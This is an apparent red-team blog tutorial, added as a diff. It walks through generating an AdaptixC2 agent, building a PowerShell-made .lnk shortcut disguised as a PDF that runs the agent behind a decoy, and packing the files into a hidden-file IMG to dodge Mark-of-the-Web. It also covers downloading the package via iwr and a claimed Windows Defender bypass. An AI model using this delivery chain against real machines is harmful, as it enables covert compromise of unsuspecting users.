@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Método de ejecución Agente C2 - AnTu97-6</title><meta name="Description" content="Blog de AnTu97-6"><meta property="og:url" content="http://localhost:1313/en/agentec2/">
+  <meta property="og:site_name" content="AnTu97-6">
+  <meta property="og:title" content="Método de ejecución Agente C2">
+  <meta property="og:description" content="Execution method Agent C2 Introduction In this post I am going to describe a way how an attacker or members of a Red Team can elaborate a malicious file and be executed in the target machine in order to gain access without being detected by the antivirus. For this post I have used the Command and Control AdaptixC2, I will not go into depth on how to install it because in the documentation itself is well detailed the process.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-06-06T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-06T17:26:34+02:00">
+    <meta property="article:tag" content="Red Team">
+    <meta property="article:tag" content="C2">
+    <meta property="article:tag" content="AdaptixC2">
+    <meta property="article:tag" content="Acceso Inicial">
+    <meta property="og:image" content="http://localhost:1313/agentec2/preimagen.jpeg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/agentec2/preimagen.jpeg">
+  <meta name="twitter:title" content="Método de ejecución Agente C2">
+  <meta name="twitter:description" content="Execution method Agent C2 Introduction In this post I am going to describe a way how an attacker or members of a Red Team can elaborate a malicious file and be executed in the target machine in order to gain access without being detected by the antivirus. For this post I have used the Command and Control AdaptixC2, I will not go into depth on how to install it because in the documentation itself is well detailed the process.">
+<meta name="application-name" content="AnTu97-6">
+<meta name="apple-mobile-web-app-title" content="AnTu97-6">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/en/agentec2/" /><link rel="prev" href="http://localhost:1313/en/sauna/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Método de ejecución Agente C2",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/en\/agentec2\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/agentec2\/preimagen.jpeg",
+                            "width":  1024 ,
+                            "height":  1024 
+                        }],"genre": "posts","keywords": "Red Team, C2, AdaptixC2, Acceso Inicial","wordcount":  692 ,
+        "url": "http:\/\/localhost:1313\/en\/agentec2\/","datePublished": "2025-06-06T00:00:00+00:00","dateModified": "2025-06-06T17:26:34+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Antu","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/en/" title="AnTu97-6">AnTu97-6</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/en/posts"> Posts </a><a class="menu-item" href="/en/tags"> Tags </a><a class="menu-item" href="/en/categories"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Select Language">
+                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/en/agentec2/" selected>English</option><option value="/agentec2/">Español</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/en/" title="AnTu97-6">AnTu97-6</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/en/posts" title="">Posts</a><a class="menu-item" href="/en/tags" title="">Tags</a><a class="menu-item" href="/en/categories" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">
+                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/en/agentec2/" selected>English</option><option value="/agentec2/">Español</option></select>
+                </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Método de ejecución Agente C2</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/en/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">included in <a href="/en/categories/red-team/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Red Team</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-06-06">2025-06-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;692 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/preimagen.jpeg"
+        data-srcset="/agentec2/preimagen.jpeg, /agentec2/preimagen.jpeg 1.5x, /agentec2/preimagen.jpeg 2x"
+        data-sizes="auto"
+        alt="/agentec2/preimagen.jpeg"
+        title="/agentec2/preimagen.jpeg" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#listener-and-agent-creation">Listener and Agent creation</a></li>
+    <li><a href="#shell-link">Shell Link</a></li>
+    <li><a href="#container">Container</a></li>
+    <li><a href="#delivery-and-execution">Delivery and execution</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="execution-method-agent-c2">Execution method Agent C2</h1>
+<h2 id="introduction">Introduction</h2>
+<p>In this post I am going to describe a way how an attacker or members of a Red Team can elaborate a malicious file and be executed in the target machine in order to gain access without being detected by the antivirus.
+For this post I have used the Command and Control AdaptixC2, I will not go into depth on how to install it because in the documentation itself is well detailed the process. Although if you encounter any problems when installing the GO version I recommend you to download the package directly from the official website here.
+I leave the repository of AdaptixC2 <a href="https://github.com/Adaptix-Framework/AdaptixC2" target="_blank" rel="noopener noreffer ">here</a> and its documentation <a href="https://adaptix-framework.gitbook.io/adaptix-framework" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="listener-and-agent-creation">Listener and Agent creation</h2>
+<p>Once we have executed the server and the client, the client interface will appear, the first thing we must do is to create a listener to which our generated agent will connect later.
+For this Post I am going to use a listener of HTTP type, for it we must click in the left superior corner in the icon of the helmets.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image.png"
+        data-srcset="/agentec2/image.png, /agentec2/image.png 1.5x, /agentec2/image.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image.png"
+        title="image.png" width="691" height="302" /></p>
+<p>Once the listeners tab is open, right click &gt; Create and the following window will appear:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%201.png"
+        data-srcset="/agentec2/image%201.png, /agentec2/image%201.png 1.5x, /agentec2/image%201.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%201.png"
+        title="image.png" width="654" height="683" /></p>
+<p>From here we can configure our listener, for this test I have only made changes in the Main settings tab, but you can also configure the HTTP headers, an error page and the Payload page.
+We indicate a name and add the ip of the machine where the server is running and a port, at the end it should look something like this:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%202.png"
+        data-srcset="/agentec2/image%202.png, /agentec2/image%202.png 1.5x, /agentec2/image%202.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%202.png"
+        title="image.png" width="648" height="687" /></p>
+<p>To finish this step we only need to generate the agent, to do so we right click on the listener just created.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%203.png"
+        data-srcset="/agentec2/image%203.png, /agentec2/image%203.png 1.5x, /agentec2/image%203.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%203.png"
+        title="image.png" width="680" height="139" /></p>
+<p>The following window will appear:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%204.png"
+        data-srcset="/agentec2/image%204.png, /agentec2/image%204.png 1.5x, /agentec2/image%204.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%204.png"
+        title="image.png" width="456" height="489" /></p>
+<p>For this test I have not made any changes, but as you can see we can modify the architecture, the type of format, the Sleep field, when we want the remote connection to end and the active time of the agent.
+We click on Generate and save our agent.</p>
+<h2 id="shell-link">Shell Link</h2>
+<p>For the execution of our agent I am going to use a .lnk file generated with PowerShell which will execute our agent and a pdf that we want to show to the target user as a decoy.</p>
+<p>This option is interesting because even if the user has enabled the option to view the extension in the browser, the .lnk extension will not be visible.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">$wsh</span> <span class="o">=</span> New-Object -ComObject WScript.Shell
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span> <span class="o">=</span> <span class="nv">$wsh</span>.CreateShortcut<span class="o">(</span><span class="s2">&#34;C:\Payloads\Documento.pdf.lnk&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.TargetPath <span class="o">=</span> <span class="s2">&#34;%COMSPEC%&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.Arguments <span class="o">=</span> <span class="s2">&#34;/C start agent.64.exe &amp;&amp; start Documento.pdf&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.IconLocation <span class="o">=</span> <span class="s2">&#34;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span>.Save<span class="o">()</span></span></span></code></pre></div></div>
+<p>If the pdf icon is not displayed it can be changed by clicking on properties and change icon.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%205.png"
+        data-srcset="/agentec2/image%205.png, /agentec2/image%205.png 1.5x, /agentec2/image%205.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%205.png"
+        title="image.png" width="558" height="528" /></p>
+<h2 id="container">Container</h2>
+<p>Once we have the three files: Document.pdf(decoy), Agent.64.exe(payload) and Document.pdf.lnk(trigger) we pack them in a single zip file to avoid having to send multiple files to the target.</p>
+<p>Mark of the web(MotW) is a zone identifier that is used to mark files downloaded from the Internet as potentially unsafe.  This can be seen in a file by viewing its properties in Explorer or using PowerShell.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%206.png"
+        data-srcset="/agentec2/image%206.png, /agentec2/image%206.png 1.5x, /agentec2/image%206.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%206.png"
+        title="image.png" width="400" height="509" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%207.png"
+        data-srcset="/agentec2/image%207.png, /agentec2/image%207.png 1.5x, /agentec2/image%207.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%207.png"
+        title="image.png" width="771" height="109" /></p>
+<p>Some archive formats support hidden files, and some do not propagate MotW.  <a href="https://github.com/nmantani/archiver-MOTW-support-comparison" target="_blank" rel="noopener noreffer ">This repository</a> by <a href="https://x.com/nmantani" target="_blank" rel="noopener noreffer ">Nobutaka Mantani</a> contains a comparison of MotW propagations.</p>
+<p>To pack our files I am going to use the <a href="https://github.com/mgeeky/PackMyPayload" target="_blank" rel="noopener noreffer ">PackMyPayload</a> tool.
+First I add the files to a folder.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -l 
+</span></span><span class="line"><span class="cl">total <span class="m">100</span>
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> n1kto n1kto <span class="m">80384</span> Jun  <span class="m">5</span> 16:22 agent.x64.exe
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> n1kto n1kto <span class="m">13264</span> Jun  <span class="m">5</span>  <span class="m">2025</span> Documento.pdf
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> n1kto n1kto  <span class="m">1859</span> Jun  <span class="m">5</span>  <span class="m">2025</span> Documento.pdf.lnk</span></span></code></pre></div></div>
+<p>And I pack them in an IMG format file hiding agen.exe and Document.pdf using the <code>-H</code> parameter.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 PackMyPayload.py -H agent.64.exe,Documento.pdf ~/Desktop/container ~/Desktop/container/package.img</span></span></code></pre></div></div>
+<h2 id="delivery-and-execution">Delivery and execution</h2>
+<p>Finally we transfer our generated file to the target machine by raising a python server:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m http.server <span class="m">8000</span></span></span></code></pre></div></div>
+<p>and in the target machine from PowerShell we download it:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> iwr -Uri http://192.168.154.128:8000/package.img -Outfile package.img</span></span></code></pre></div></div>
+<p>We open package.img and open the file it contains, thus producing the connection of the agent with our Command and control and all this with Windows Defender activated.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%208.png"
+        data-srcset="/agentec2/image%208.png, /agentec2/image%208.png 1.5x, /agentec2/image%208.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%208.png"
+        title="image.png" width="276" height="51" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%209.png"
+        data-srcset="/agentec2/image%209.png, /agentec2/image%209.png 1.5x, /agentec2/image%209.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%209.png"
+        title="image.png" width="1126" height="610" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/agentec2/image%2010.png"
+        data-srcset="/agentec2/image%2010.png, /agentec2/image%2010.png 1.5x, /agentec2/image%2010.png 2x"
+        data-sizes="auto"
+        alt="/agentec2/image%2010.png"
+        title="image.png" width="1269" height="141" /></p>
+<p>I remind you that this post is for educational and ethical purposes and should not be used for illegal purposes.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-06-06&nbsp;<a class="git-hash" href="https://github.com/AnTu97-6/AnTu97-6.github.io/commit/a11b3e2521b4ef32f4959702cfd1f3764353e838" target="_blank" title="commit by Antonio(59934600&#43;AnTu97-6@users.noreply.github.com) a11b3e2521b4ef32f4959702cfd1f3764353e838: Update index.en.md">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>a11b3e2</a></span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/en/agentec2/" data-title="Método de ejecución Agente C2" data-hashtags="Red Team,C2,AdaptixC2,Acceso Inicial"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/en/agentec2/" data-title="Método de ejecución Agente C2"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/en/agentec2/" data-hashtag="Red Team"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/en/agentec2/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/en/agentec2/" data-title="Método de ejecución Agente C2" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fen%2fagentec2%2f&amp;text=M%c3%a9todo%20de%20ejecuci%c3%b3n%20Agente%20C2" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/en/tags/red-team/">Red Team</a>,&nbsp;<a href="/en/tags/c2/">C2</a>,&nbsp;<a href="/en/tags/adaptixc2/">AdaptixC2</a>,&nbsp;<a href="/en/tags/acceso-inicial/">Acceso Inicial</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/en/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/en/sauna/" class="prev" rel="prev" title="Sauna Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Sauna Walkthrough</a></div>
+</div>
+</article></div>
+            </main></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true};</script><script src="/js/theme.min.js"></script><script>
+            var doNotTrack = false;
+            if ( false ) {
+                var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+                var doNotTrack = (dnt == "1" || dnt == "yes");
+            }
+            if (!doNotTrack) {
+                window.dataLayer = window.dataLayer || [];
+                function gtag(){dataLayer.push(arguments);}
+                gtag('js', new Date());
+                gtag('config', 'G-JZJ8R9MHR6');
+            }
+        </script><script src="https://www.googletagmanager.com/gtag/js?id=G-JZJ8R9MHR6" async></script><script>
+        window.fathom=window.fathom||function(){(fathom.q=fathom.q||[]).push(arguments);};
+        fathom('set', 'siteId', 'G-JZJ8R9MHR6');
+        fathom('trackPageview');
+    </script><script src="https://cdn.usefathom.com/tracker.js" async id=fathom-script></script><script>
+       (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+       m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+       (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+       ym("G-JZJ8R9MHR6", "init", {
+            clickmap:true,
+            trackLinks:true,
+            accurateTrackBounce:true
+       });
+    </script>
+    <noscript><div><img src="https://mc.yandex.ru/watch/G-JZJ8R9MHR6" style="position:absolute; left:-9999px;" alt="" /></div></noscript></body>
+</html>
